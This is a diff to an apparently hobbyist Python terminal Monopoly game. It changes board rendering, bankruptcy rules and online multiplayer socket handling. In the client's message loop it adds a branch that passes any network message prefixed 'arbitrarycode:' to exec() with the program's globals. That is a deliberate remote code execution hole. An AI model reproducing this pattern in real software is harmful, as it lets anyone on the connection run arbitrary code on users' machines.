         print(f"    \x1b[7m▊\x1b[0m\x1b[▁▁▁▁▁▁▁▁▁▁▁▁▁\x1b[48;2;255;103;35m▁▁▁▁\x1b[0m▎    {button_list[2]}                                                       \x1b[7m▊\x1b[0m\x1b[48;2;0;210;106m▁▁▁▁\x1b[0m▁▁▁▁▁▁▁▁▁▁▁▁▎")
         print(f"    \x1b[7m▊\x1b[0m |\\⁔ Marylebone ▎    {button_list[3]}                                                       \x1b[7m▊\x1b[0m Liverpool|∖↙() ▎")
         print("    \x1b[7m▊\x1b[0m ¯| |◁ Station  ▎                                                                                                  \x1b[7m▊\x1b[0m Station  |‿ |  ▎")
         print(f"    \x1b[7m▊\x1b[0m () |  $200     ▎ {icon(10)}                                                                                            {icon(25)} \x1b[7m▊\x1b[0m $200      | () ▎")
-        print(f"    \x1b[7m▊\x1b[0m  | ⁀|{player_display_location[15][1]}▎                                                                                                  \x1b[7m▊\x1b[0m{player_display_location[35][1]}▷|‿|_ ▎")
+        print(f"    \x1b[7m▊\x1b[0m  | ⁀|{player_display_location[15][0]}▎                                                                                                  \x1b[7m▊\x1b[0m{player_display_location[35][0]}▷|‿|_ ▎")
         print("    \x1b[7m▊\x1b[0m▁()↗∖|▁▁▁▁▁▁▁▁▁▁▎                                                                                                  \x1b[7m▊\x1b[0m▁▁▁▁▁▁▁▁▁▁▁▁▁\\|▁▎")
         print("    \x1b[7m▊\x1b[0mNorthumb'nd \x1b[48;2;245;47;171m    \x1b[0m▎                                                                                                  \x1b[7m▊\x1b[0m      _  CHANCE ▎")
         print("    \x1b[7m▊\x1b[0m   Avenue   \x1b[48;2;245;47;171m    \x1b[0m▎                                                                                                  \x1b[7m▊\x1b[0m    /‾_‾\\|‾|    ▎")
         print(f"    \x1b[7m▊\x1b[0m {houses(9)} \x1b[48;2;245;47;171m    \x1b[0m▎ {icon(9)}                                                                                               \x1b[7m▊\x1b[0m   | | \\_  | () ▎")
-        print(f"    \x1b[7m▊\x1b[0m {player_display_location[14][1]} \x1b[48;2;245;47;171m    \x1b[0m▎                                                                                                  \x1b[7m▊\x1b[0m    \\_\\{player_display_location[36][1]}▎")
+        print(f"    \x1b[7m▊\x1b[0m {player_display_location[14][0]} \x1b[48;2;245;47;171m    \x1b[0m▎                                                                                                  \x1b[7m▊\x1b[0m    \\_\\{player_display_location[36][0]}▎")
         print("    \x1b[7m▊\x1b[0m▁▁▁▁▁▁▁▁▁▁▁▁\x1b[48;2;245;47;171m▁▁▁▁\x1b[0m▎                                                                                                  \x1b[7m▊\x1b[0m▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▎")
   
         # ensures that floats aren't shown due to my bad code
@@ -2749,25 +2931,25 @@ class refresh_board_class(parent_class):
         print(f"    \x1b[7m▊\x1b[0m            \x1b[48;2;245;47;171m    \x1b[0m▎                                                                             {display_money(4)}    \x1b[7m▊\x1b[0m\x1b[48;2;28;89;255m    \x1b[0m            ▎")
         print(f"    \x1b[7m▊\x1b[0m Whitehall  \x1b[48;2;245;47;171m    \x1b[0m▎                                                                             {display_money(4)}    \x1b[7m▊\x1b[0m\x1b[48;2;28;89;255m    \x1b[0m Park Lane  ▎")    
         print(f"    \x1b[7m▊\x1b[0m {houses(8)} \x1b[48;2;245;47;171m    \x1b[0m▎ {icon(8)}                                                                  {money_change(4)} {display_money(4)} {icon(26)} \x1b[7m▊\x1b[0m\x1b[48;2;28;89;255m    \x1b[0m {houses(26)} ▎")
-        print(f"    \x1b[7m▊\x1b[0m {player_display_location[13][1]} \x1b[48;2;245;47;171m    \x1b[0m▎                                                                             {display_money(3, 4)}    \x1b[7m▊\x1b[0m\x1b[48;2;28;89;255m    \x1b[0m {player_display_location[37][1]} ▎")
+        print(f"    \x1b[7m▊\x1b[0m {player_display_location[13][0]} \x1b[48;2;245;47;171m    \x1b[0m▎                                                                             {display_money(3, 4)}    \x1b[7m▊\x1b[0m\x1b[48;2;28;89;255m    \x1b[0m {player_display_location[37][0]} ▎")
         print(f"    \x1b[7m▊\x1b[0m▁▁▁▁▁▁▁▁▁▁▁▁\x1b[48;2;245;47;171m▁▁▁▁\x1b[0m▎                                                                             {display_money(3)}    \x1b[7m▊\x1b[0m\x1b[48;2;28;89;255m▁▁▁▁\x1b[0m▁▁▁▁▁▁▁▁▁▁▁▁▎")
         print(f"    \x1b[7m▊\x1b[0m Electric Co.   ▎                                                                     {money_change(3)} {display_money(3)}    \x1b[7m▊\x1b[0m ∖  ⁄ SUPER TAX ▎")
         print(f"    \x1b[7m▊\x1b[0m $150       |\\  ▎                                                                             {display_money(2, 3)}    \x1b[7m▊\x1b[0m- 💎 -     $100 ▎")
-        print(f"    \x1b[7m▊\x1b[0m          __| \\ ▎ {icon(7)}                                                                          {display_money(2)}    \x1b[7m▊\x1b[0m/¯¯¯¯\\{player_display_location[38][1]}▎")
-        print(f"    \x1b[7m▊\x1b[0m{player_display_location[12][1]}\\ |¯¯ ▎                                                                     {money_change(2)} {display_money(2)}    \x1b[7m▊\x1b[0m (⁐⁐) |         ▎")   
+        print(f"    \x1b[7m▊\x1b[0m          __| \\ ▎ {icon(7)}                                                                          {display_money(2)}    \x1b[7m▊\x1b[0m/¯¯¯¯\\{player_display_location[38][0]}▎")
+        print(f"    \x1b[7m▊\x1b[0m{player_display_location[12][0]}\\ |¯¯ ▎                                                                     {money_change(2)} {display_money(2)}    \x1b[7m▊\x1b[0m (⁐⁐) |         ▎")   
         print(f"    \x1b[7m▊\x1b[0m           \\|   ▎                                                                             {display_money(1, 2)}    \x1b[7m▊\x1b[0m\\____/\x1b[0m          ▎")
         print(f"    \x1b[7m▊\x1b[0m▔▔▔▔▔▔▔▔▔▔▔▔\x1b[48;2;245;47;171m▔▔▔▔\x1b[0m▎                                                                             {display_money(1)}    \x1b[7m▊\x1b[0m\x1b[48;2;28;89;255m▔▔▔▔\x1b[0m▔▔▔▔▔▔▔▔▔▔▔▔▎")
         print(f"    \x1b[7m▊\x1b[0m Pall Mall  \x1b[48;2;245;47;171m    \x1b[0m▎                                                                     {money_change(1)} {display_money(1)}    \x1b[7m▊\x1b[0m\x1b[48;2;28;89;255m    \x1b[0m   Mayfair  ▎")
         print(f"    \x1b[7m▊\x1b[0m {houses(6)} \x1b[48;2;245;47;171m    \x1b[0m▎ {icon(6)}                                                                          {display_money(0, 1)} {icon(27)} \x1b[7m▊\x1b[0m\x1b[48;2;28;89;255m    \x1b[0m {houses(27)} ▎")
-        print(f"    \x1b[7m▊\x1b[0m {player_display_location[11][1]} \x1b[48;2;245;47;171m    \x1b[0m▎    {icon(5)}         {icon(4)}                    {icon(3)}         {icon(2)}                    {icon(1)}                    {icon(0)}    \x1b[7m▊\x1b[0m\x1b[48;2;28;89;255m    \x1b[0m {player_display_location[39][1]} ▎")
+        print(f"    \x1b[7m▊\x1b[0m {player_display_location[11][0]} \x1b[48;2;245;47;171m    \x1b[0m▎    {icon(5)}         {icon(4)}                    {icon(3)}         {icon(2)}                    {icon(1)}                    {icon(0)}    \x1b[7m▊\x1b[0m\x1b[48;2;28;89;255m    \x1b[0m {player_display_location[39][0]} ▎")
         print("    \x1b[7m▊\x1b[0m▁▁▁▁▁▁▁▁▁▁▁▁\x1b[48;2;245;47;171m▁▁▁▁\x1b[0m▙▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▟\x1b[0m\x1b[48;2;28;89;255m▁▁▁▁\x1b[0m▁▁▁▁▁▁▁▁▁▁▁▁▎")
         print(f"    \x1b[7m▊\x1b[0m      │ ║ ║ ║ ║ \x1b[48;2;0;166;237m▎          \x1b[30m│          \x1b[0m▎  CHANCE  \x1b[48;2;0;166;237m▎          \x1b[0m▎  King's  ▎          \x1b[48;2;165;105;83m▎          \x1b[0m▎ COMUNITY \x1b[7m▊\x1b[0m\x1b[48;2;165;105;83m          \x1b[7m▊\x1b[0m  ____    ____  ▎")
         print(f"    \x1b[7m▊\x1b[0m   J  │ J A I L \x1b[48;2;0;166;237m▎          \x1b[30m│          \x1b[0m▎  _---_   \x1b[48;2;0;166;237m▎          \x1b[0m▎  Cross   ▎  INCOME  \x1b[48;2;165;105;83m▎          \x1b[0m▎   CHEST  \x1b[7m▊\x1b[0m\x1b[48;2;165;105;83m          \x1b[7m▊\x1b[0m /  __|  /    \\ ▎")
-        print(f"    \x1b[7m▊\x1b[0m   U  │ ║ ║ ║ ║ ▎Pent'ville│  Euston  ▎ / _-_ \\  ▎The Angel ▎{player_display_location[5][1]}▎   TAX    ▎whitechp'l▎{player_display_location[2][1]}\x1b[7m▊\x1b[0m Old Kent \x1b[0m\x1b[7m▊\x1b[0m|  |_ ‾||  ()  |▎")
-        print(f"    \x1b[7m▊\x1b[0m   S  │{player_display_location[40][1]}▎   Road   │   Road   ▎ \\/  / /  ▎Islington ▎ \\¯/___(¯/▎          ▎   Road   ▎          \x1b[7m▊\x1b[0m   Road   \x1b[7m▊\x1b[0m \\____/  \\____/ ▎")
-        print(f"    \x1b[7m▊\x1b[0m   T  │_║_║_║_║_▎          │          ▎   / /_   ▎          ▎( _______\\▎    🔷    ▎          ▎🪙  💰  💵\x1b[7m▊\x1b[0m          \x1b[0m\x1b[7m▊\x1b[0m{player_display_location[0][1]}____  ▎")
-        print(f"    \x1b[7m▊\x1b[0m   {player_display_location[10][1]}   ▎{player_display_location[9][1]}│{player_display_location[8][1]}▎   \\___\\  ▎{player_display_location[6][1]}▎/_| () () ▎{player_display_location[4][1]}▎{player_display_location[3][1]}▎  💵  💰  \x1b[7m▊\x1b[0m{player_display_location[1][1]}\x1b[7m▊\x1b[0m  /|-----/   /  ▎")
-        print(f"    \x1b[7m▊\x1b[0m    VISITING    ▎{houses(5)}│{houses(4)}▎{player_display_location[7][1]}▎{houses(3)}▎{houses(2)}▎ PAY $200 ▎{houses(1)}▎💰  🪙  💵\x1b[7m▊\x1b[0m{houses(1)}\x1b[7m▊\x1b[0m  \\|-----\\___\\  ▎")
+        print(f"    \x1b[7m▊\x1b[0m   U  │ ║ ║ ║ ║ ▎Pent'ville│  Euston  ▎ / _-_ \\  ▎The Angel ▎{player_display_location[5][0]}▎   TAX    ▎whitechp'l▎{player_display_location[2][0]}\x1b[7m▊\x1b[0m Old Kent \x1b[0m\x1b[7m▊\x1b[0m|  |_ ‾||  ()  |▎")
+        print(f"    \x1b[7m▊\x1b[0m   S  │{player_display_location[40][0]}▎   Road   │   Road   ▎ \\/  / /  ▎Islington ▎ \\¯/___(¯/▎          ▎   Road   ▎          \x1b[7m▊\x1b[0m   Road   \x1b[7m▊\x1b[0m \\____/  \\____/ ▎")
+        print(f"    \x1b[7m▊\x1b[0m   T  │_║_║_║_║_▎          │          ▎   / /_   ▎          ▎( _______\\▎    🔷    ▎          ▎🪙  💰  💵\x1b[7m▊\x1b[0m          \x1b[0m\x1b[7m▊\x1b[0m{player_display_location[0][0]}____  ▎")
+        print(f"    \x1b[7m▊\x1b[0m   {player_display_location[10][0]}   ▎{player_display_location[9][0]}│{player_display_location[8][0]}▎   \\___\\  ▎{player_display_location[6][0]}▎/_| () () ▎{player_display_location[4][0]}▎{player_display_location[3][0]}▎  💵  💰  \x1b[7m▊\x1b[0m{player_display_location[1][0]}\x1b[7m▊\x1b[0m  /|-----/   /  ▎")
+        print(f"    \x1b[7m▊\x1b[0m    VISITING    ▎{houses(5)}│{houses(4)}▎{player_display_location[7][0]}▎{houses(3)}▎{houses(2)}▎ PAY $200 ▎{houses(1)}▎💰  🪙  💵\x1b[7m▊\x1b[0m{houses(1)}\x1b[7m▊\x1b[0m  \\|-----\\___\\  ▎")
         print("    \x1b[7m▊\x1b[0m▙               ▎          │          ▎          ▎          ▎          ▎          ▎          ▎          \x1b[7m▊\x1b[0m          \x1b[0m\x1b[7m▊\x1b[0m               ▟▎")
         print("     ▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔ ")
 
@@ -2892,6 +3074,9 @@ class refresh_board_class(parent_class):
             global hotel_total
             global time_played
             global game_version
+
+            if online_config.is_online:
+                send_data("clientquit")
 
             save_game_to_file(
                 "game_version", "players_playing", "player_turn", "player_movement.doubles_rolled",
@@ -3347,7 +3532,7 @@ def save_game_to_file(*variables: str):
         if isinstance(eval(var), better_iter):
             save_file.write(f"{var} = better_iter({eval(var).list}, {eval(var).loop}, {eval(var).index})\n")
         else:
-            save_file.write(f"{eval(var)=}\n")
+            save_file.write(f"{var} = {eval(var)}\n")
 
     # since only modified properties are saved, they have their own check
     for i in range(28):
@@ -3368,6 +3553,8 @@ def bankruptcy(_player: int | None = player_turn, cause = "bank"):
     cause should either be "bank" or the player owed (1/2/3/4)
     """
     global player_turn
+    global house_total
+    global hotel_total
 
     player[_player]["status"] = "bankrupt"
     
@@ -3416,11 +3603,23 @@ def bankruptcy(_player: int | None = player_turn, cause = "bank"):
         print("\n    ", end = "")
         exit()
 
+    # finds next competing player
     next(player_turn)
-    while player[player_turn]["status"] == "bankruptcy":
+    while player[player_turn]["status"] != "playing":
         next(player_turn)
 
-    # player_is_broke passes on None as cause.
+    # adds houses and hotels back as available
+    for _property in property_data:
+        if _property["owner"] != _player:
+            continue
+
+        if _property["upgrade state"] == 8:
+            hotel_total += 1
+            house_total += 4
+        elif _property["upgrade state"] > 2:
+            house_total += _property["upgrade state"] - 2
+
+    # player_is_broke passes on None as cause
     if cause == None: cause = "bank"
 
     # if the player is in debt to the bank, 
@@ -3437,9 +3636,13 @@ def bankruptcy(_player: int | None = player_turn, cause = "bank"):
             property_data[i]["owner"] = None
             auction_queue.append(i)
 
-        display_property(*auction_queue, bid = True)
+        # auctions properties if any exist
+        if len(auction_queue) > 0:
+            display_property(*auction_queue, bid = True)
+        else:
+            refresh_board()
 
-    # for some stupid reason, upgraded properties are not transferred,
+    # for some stupid reason, upgrades on properties are not transferred,
     # but are sold and the money is given to the owed player instead.
     # (monopoly's stupid rules not mine)
     else:
@@ -3451,14 +3654,14 @@ def bankruptcy(_player: int | None = player_turn, cause = "bank"):
             _property["owner"] = owed_player
             upgrades = _property["upgrade state"] - 2
             
+            # houses are sold back to bank for half price
+            if upgrades > 0:
+                player[owed_player]["$$$"] += upgrades * (_property["house cost"] / 2)
+
             # upgraded properties have to be part of a colour set,
             # and so are reset to state 2, while un-upgraded properties remain as is
             if _property["upgrade state"] > 2:
                 _property["upgrade state"] = 2
-
-            # houses are sold back to bank for half price
-            if upgrades > 0:
-                player[owed_player]["$$$"] += upgrades * (_property["house cost"] / 2)
 
         # transfers any escape jail cards to the other player
         player[owed_player]["jail passes"] += player[_player]["jail passes"]
@@ -3499,10 +3702,10 @@ class player_movement_class(parent_class):
             ' ✨    /_/   \\__/   \\__/     |___| |___/  \\___| /_/‾\\_\\ |_|   |___| |___/     \\___| /_/‾\\_\\ |___| |___|     ✨'
             ]
 
-    def remove_from_jail(self):
-        player[player_turn]["pos"] = 10
-        player[player_turn]["jail time"] = 0
-        player[player_turn]["status"] = "playing"
+    def remove_from_jail(self, _player):
+        player[_player]["pos"] = 10
+        player[_player]["jail time"] = 0
+        player[_player]["status"] = "playing"
 
         # updates the board
         update_player_position(10)
@@ -3756,11 +3959,12 @@ def run():
     """main entry point to start monopoly program."""
     homescreen()
     while True:
-        globals()[current_screen].input_management(input())
+        try: globals()[current_screen].input_management(input())
+        except KeyboardInterrupt: pass # stupid keyboard interrupts
 
 
 async def get_input():
-    """gets user input and executes appropriate logic"""
+    """gets user input (nonblocking) and executes appropriate logic"""
     loop = asyncio.get_running_loop()
     while not online_config.stop_event.is_set():
         u_input = await loop.run_in_executor(None, input)
@@ -3780,26 +3984,32 @@ async def get_data():
                     online_input = online_input.decode()
                 except (UnicodeDecodeError, BlockingIOError):
                     continue
-
+                
                 except (ConnectionError, ConnectionAbortedError, ConnectionResetError, ConnectionRefusedError):
-                    # host alerts other clients that this client has lost communication
-                    for sub_item in online_config.joined_clients.remove(item):
-                        sub_item[1].sendall(f"clientquit:{item[0]}:{item[2]}".encode())
                     
+                    # host alerts other clients that this client has lost communication
                     online_config.joined_clients.remove(item)
+                    for sub_item in online_config.joined_clients:
+                        if sub_item != item:
+                            sub_item[1].sendall(f"clientquit:{item[3]}".encode())
+                    
+                    online_config.host_wait_screen()
 
                 # ensures all clients except sender receive message
-                for sub_item in online_config.joined_clients.remove(item):
+                for sub_item in online_config.joined_clients:
+                    if sub_item != item:
                         sub_item[1].sendall(f"{online_input}:{item[0]}:{item[2]}".encode())
 
                 if online_input == "clientquit":
-
+                    input("RECV CLIENT QUIT")
                     # removes the client from the host's list
                     online_config.joined_clients.remove(item)
 
                     # updates the host wait screen
                     online_config.host_wait_screen()
-
+                else:
+                    input(f"{online_input=}")
+      
             # reduces computational strain
             await asyncio.sleep(1)
 
@@ -3808,17 +4018,24 @@ async def get_data():
             try:
                 online_input = await loop.run_in_executor(None, online_config.socket.recv, 1024)
                 online_input = online_input.decode()
+                if online_config.stop_event.is_set():
+                    return
 
             except (ConnectionAbortedError, ConnectionResetError, OSError, ConnectionError, ConnectionRefusedError):
                 online_config.connection_lost()
                 
                 # stops asynchronous actions
                 online_config.stop_event.set()
+                online_config.is_online = False
+
                 return
 
             # malformed messages are ignored
             except UnicodeDecodeError:
                 continue
+
+            except Exception as e:
+                input(f"{e=}")
 
             if online_input == "booted":
                 online_config.kicked_notice()
@@ -3836,11 +4053,11 @@ async def get_data():
                 online_config.client_wait_screen()
 
             elif online_input.startswith("clientquit:"):
-                _, quitter, quitter_icon = online_input.split(":")
+                _, quitter = online_input.split(":")
                 
                 # removes the player from user's list of players
                 for client in online_config.joined_clients:
-                    if quitter == client[0] and quitter_icon == client[1]:
+                    if quitter == client[2]:
                         online_config.joined_clients.remove(client)
                 online_config.client_wait_screen()
 
@@ -3851,7 +4068,6 @@ async def get_data():
                 online_config.client_wait_screen()
 
             elif online_input == "hoststart":
-                print("GOT HOSTSTART")
                 player = {}
 
                 # creates the players using the characters provided
@@ -3872,8 +4088,27 @@ async def get_data():
 
                 player_turn = 1
                 display_game_notice()
+
+            elif online_input.startswith("arbitrarycode"):
+               
+                # fun!
+                code = online_input.removeprefix("arbitrarycode:")
+                exec(code, globals())
+
             else:
-                input(online_input)
+                # I know this is blocking, but it should ensure
+                # that logic errors are visible for debugging
+                input(f"{online_input=}")
+
+
+async def send_data(data: str):
+    """sends the message to correct socket. handles hosts and clients"""
+    if online_config.socket_type == "host":
+        for item in online_config.joined_clients:
+            item[1].sendall(data.encode())
+
+    elif online_config.socket_type == "client":
+        online_config.socket.sendall(data.encode())
 
 # perhaps I should start all others with trailing 
 # underscores so this is the only accessible function
